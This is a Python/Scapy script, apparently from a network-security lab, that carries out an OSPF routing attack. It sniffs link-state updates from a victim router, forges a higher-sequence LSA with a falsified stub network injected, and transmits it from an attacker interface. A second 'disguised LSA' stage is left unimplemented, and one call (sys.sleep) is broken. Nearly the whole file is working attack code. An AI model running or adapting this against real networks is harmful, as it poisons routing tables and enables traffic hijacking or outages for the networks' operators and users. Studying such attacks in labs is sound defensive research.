#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime
import copy

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep

from utils import log, log2


load_contrib("ospf")


ATTACKER_ROUTER_IFACE = 'R6-eth2'
VICTIM_ROUTER_ID = '4.4.4.4'
IPV4_MCAST_05 = '01:00:5e:00:00:05' # LSA UPDATE multicast destination mac address 

SEND_INTERVAL = 10
TRIGGER_COUNT_LIMIT = 5

trigger_count = 0 # after how many LSA from victim router, we send the trigger LSA
sent = 0 # flag to say if trigger lsa has been sent or not

src_mac_address = ''


def alterate_lsa(lsa):
	false_link = None

	for link in lsa.linklist:
		
		if link.type == 3: # stub
			false_link = copy.deepcopy(link)

			###[ OSPF Link ]###
			false_link.id = '10.0.66.0'
			false_link.data = '255.255.255.0'

			###[ OSPF Router LSA ]###
			lsa.linklist.append(false_link)
			lsa.linkcount = lsa.linkcount + 1			

			return


def create_trigger_frame(frame, lsa):
	print src_mac_address

	###[ Ethernet ]###
	frame.src = src_mac_address
	frame.dst = IPV4_MCAST_05

	###[ IP ]###
	ip_packet = frame.getlayer(IP)
	ip_packet.id = ip_packet.id + 1
	ip_packet.len = None
	ip_packet.chksum = None

	###[ OSPF Router LSA ]###
	lsa.seq = lsa.seq + 1
	lsa.age = 0
	lsa.len = None
	lsa.chksum = None
	
	ospf_packet = ip_packet.payload
	ospf_packet.len = None
	ospf_packet.chksum = None

	ospf_packet[OSPF_Hdr].lsalist = []
	ospf_packet[OSPF_Hdr].lsalist.append(lsa)
	ospf_packet[OSPF_Hdr].lsacount = 1

	alterate_lsa(lsa)

	frame.show2()
	# show2() same as show 
	# but on the assembled packet (checksum is calculated, for instance)

	return frame


def frame_callback(frame):
	global sent
	global trigger_count

	if frame.src == src_mac_address:
		print '.'
		# sending trigger LSA on R6-eth2

		# sent is a flag, 0 => not sent, 1 => sent
		if sent == 0 and frame.getlayer(IP) and \
			frame.getlayer(IP).proto == 89: # OSPF

			ospf_packet = frame.getlayer(IP).payload

			if ospf_packet.type == 4: # LS Update
				for lsa in ospf_packet[OSPF_Hdr].lsalist:
					if lsa.adrouter == VICTIM_ROUTER_ID:
						print '------- %d ---------' % trigger_count

						if trigger_count > TRIGGER_COUNT_LIMIT:
							print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
							frame.show()
							print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'

							trigger_frame = create_trigger_frame(frame, lsa)
							sendp(trigger_frame, iface=ATTACKER_ROUTER_IFACE)
							sent = 1
						else:
							trigger_count = trigger_count + 1

		sys.stdout.flush()


def send_trigger_lsa():
	# we monitor frames
	# once we get one LSA sent by VICTIM ROUTER
	# we send a trigger LSA

	sniff(prn=frame_callback, filter='ip', store=0)


def send_disguised_lsa():
	print 'send_disguised_lsa(): to be implemented'

	pass


def main():
	global src_mac_address
	src_mac_address = sys.argv[1]
	assert src_mac_address is not None

	send_trigger_lsa()

	sys.sleep(SEND_INTERVAL)

	send_disguised_lsa()

	# TODO
	# e' possibile che la maggior parte degli LSA vengano inviati su eth1 e non su eth2
	# dato che vengono ricevuti su eth2 e inviati su eth1
	# e quindi non vengono elaborati dal filtro
	# quindi filtrare indipendentemente dal src_mac_address 
	# e decidere se inviare il frame modificato sulla stessa interfaccia o sull'altra


if __name__ == "__main__":
	main()

